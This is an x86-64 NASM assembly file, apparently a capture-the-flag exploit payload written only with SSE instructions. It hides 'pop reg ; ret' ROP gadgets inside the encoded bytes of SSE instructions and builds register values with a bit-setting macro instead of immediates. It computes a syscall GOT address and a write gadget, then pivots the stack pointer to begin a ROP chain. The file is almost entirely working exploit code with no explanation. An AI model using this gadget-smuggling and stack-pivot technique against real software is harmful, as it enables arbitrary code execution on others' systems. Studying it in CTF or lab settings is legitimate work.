BITS 64

%macro   set_bits 4
  movaps  %2, xmm7           ; 3 B  tmp = -1
  psrlq   %2, 64-(%3)        ; 5 B  keep len bits
  psllq   %2, %4             ; 5 B  position them
  paddq   %1, %2             ; 4 B  add into dst
%endmacro

; pop rax ; ret
addps     xmm0, xmm3
; pop rcx ; ret
mulps     xmm0, xmm3
; pop rdx ; ret
cvtps2pd  xmm0, xmm3
; pop rsi ; ret
divps     xmm0, xmm3
; pop rsi ; ret
maxps     xmm0, xmm3

pcmpeqb   xmm7, xmm7

; rdi = 0
; rsi = 0
pxor      xmm0, xmm0
movq      rdi, xmm0
movq      rsi, xmm0

; xmm5 = r9 + 0x309884 -> syscall GOT
pxor      xmm0, xmm0
set_bits  xmm0, xmm1, 1,  2
set_bits  xmm0, xmm1, 1,  7
set_bits  xmm0, xmm1, 2, 11
set_bits  xmm0, xmm1, 1, 15
set_bits  xmm0, xmm1, 2, 20
movq      xmm5, r9
paddq     xmm5, xmm0

; rdx = xmm5 + 0x08 -> syscall GOT + 0x08
pxor      xmm0, xmm0
set_bits  xmm0, xmm1, 1,  3
movq      xmm4, xmm5
paddq     xmm4, xmm0
movq      rdx, xmm4

; rcx = 0x1000
pxor      xmm0, xmm0
set_bits  xmm0, xmm1, 1, 12
movq rcx, xmm0

movq      xmm6, r11

; rax = r11 + 0x1c3 -> rax = 0x133701c3 -> add byte ptr [rax], al -> ret
pxor      xmm0, xmm0
set_bits  xmm0, xmm1, 2,  0
set_bits  xmm0, xmm1, 3,  6
movq      xmm4, xmm6
paddq     xmm4, xmm0
movq      rax, xmm4

movq      xmm6, rax

movq      rsp, xmm5
